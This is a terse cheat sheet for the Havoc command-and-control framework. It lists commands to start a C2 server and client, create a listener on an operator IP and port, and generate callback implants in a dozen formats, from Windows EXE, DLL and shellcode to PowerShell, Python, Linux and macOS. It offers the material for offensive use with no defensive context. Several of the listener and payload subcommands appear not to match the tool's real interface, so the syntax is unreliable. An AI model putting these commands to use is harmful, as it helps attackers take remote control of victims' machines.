# Havoc C2

% havoc

#plateform/linux #target/remote #cat/C2 #tag/command-control

## Start Havoc Server
#cat/SETUP 
```
sudo ./havoc server
```

## Start Havoc Client
#cat/SETUP 
```
./havoc client
```

## Generate Listener
#cat/SETUP 
```
havoc listener --name <listener_name> --host <ip> --port <port>
```

## Generate Windows EXE Payload
#cat/PAYLOAD 
```
havoc payload --listener <listener_name> --format exe --output <output_file>
```

## Generate Windows DLL Payload
#cat/PAYLOAD 
```
havoc payload --listener <listener_name> --format dll --output <output_file>
```

## Generate Shellcode Payload
#cat/PAYLOAD 
```
havoc payload --listener <listener_name> --format shellcode --output <output_file>
```

## Generate Raw Payload
#cat/PAYLOAD 
```
havoc payload --listener <listener_name> --format raw --output <output_file>
```

## Generate PowerShell Payload
#cat/PAYLOAD 
```
havoc payload --listener <listener_name> --format powershell --output <output_file>
```

## Generate Python Payload
#cat/PAYLOAD 
```
havoc payload --listener <listener_name> --format python --output <output_file>
```

## Generate C# Payload
#cat/PAYLOAD 
```
havoc payload --listener <listener_name> --format csharp --output <output_file>
```

## Generate Linux Payload
#cat/PAYLOAD 
```
havoc payload --listener <listener_name> --format linux --output <output_file>
```

## Generate MacOS Payload
#cat/PAYLOAD 
```
havoc payload --listener <listener_name> --format macos --output <output_file>
```

## List Available Listeners
#cat/UTILS 
```
havoc listener --list
```

## List Available Payload Formats
#cat/UTILS 
```
havoc payload --formats
```

## Show Payload Help
#cat/UTILS 
```
havoc payload --help
```

## Show Listener Help
#cat/UTILS 
```
havoc listener --help
```
